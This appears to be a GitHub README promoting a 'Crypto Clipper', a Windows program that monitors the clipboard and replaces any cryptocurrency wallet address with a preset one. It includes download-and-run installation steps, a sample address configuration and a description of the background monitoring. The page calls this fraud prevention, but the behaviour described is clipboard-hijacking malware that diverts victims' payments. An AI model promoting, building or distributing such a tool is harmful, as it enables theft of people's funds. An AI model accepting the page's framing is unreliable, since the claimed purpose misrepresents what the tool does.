- **Address Replacement**: Replaces detected addresses with predefined ones to prevent fraud.
- **RSA Encryption**: Utilizes RSA encryption for secure data handling.
- **User-Friendly Interface**: Simple and straightforward interface for ease of use.
- **Customizable**: Allows users to define their own wallet addresses for replacement.

## Installation

To get started, you need to download the latest version of the tool. You can find it in the [Releases section](https://github.com/FelixOyeleke/Crypto-Clipper-C-Sharp-1e/releases). Download the appropriate file and execute it to install the tool on your system.

### Requirements

- Windows OS
- .NET Framework 4.5 or higher

## Usage

Once you have installed the tool, follow these steps to use it:

1. **Launch the Application**: Open the Crypto Clipper application.
2. **Configure Settings**: Set your predefined wallet addresses in the settings menu.
3. **Monitor Clipboard**: The tool will start monitoring your clipboard for any cryptocurrency addresses.
4. **Automatic Replacement**: If a wallet address is detected, it will automatically replace it with your predefined address.

### Example Configuration

Here‚Äôs an example of how to set your predefined addresses:

```json
{
  "addresses": {
    "bitcoin": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    "ethereum": "0x32Be343B94f860124dC4fEe278FDCBD38C102D88"
  }
}
```

## How It Works

The Crypto Clipper tool operates by continuously monitoring the clipboard for any text that matches the regex patterns defined for cryptocurrency wallet addresses. When it detects a match, it replaces the address with a predefined one, which you can customize.

### Technical Details

- **Regex Detection**: The tool uses regular expressions to identify different cryptocurrency addresses.
- **RSA Encryption**: It employs RSA encryption to ensure that your data remains secure during the replacement process.
- **Efficiency**: The application runs in the background with minimal resource usage, ensuring that it does not slow down your system.
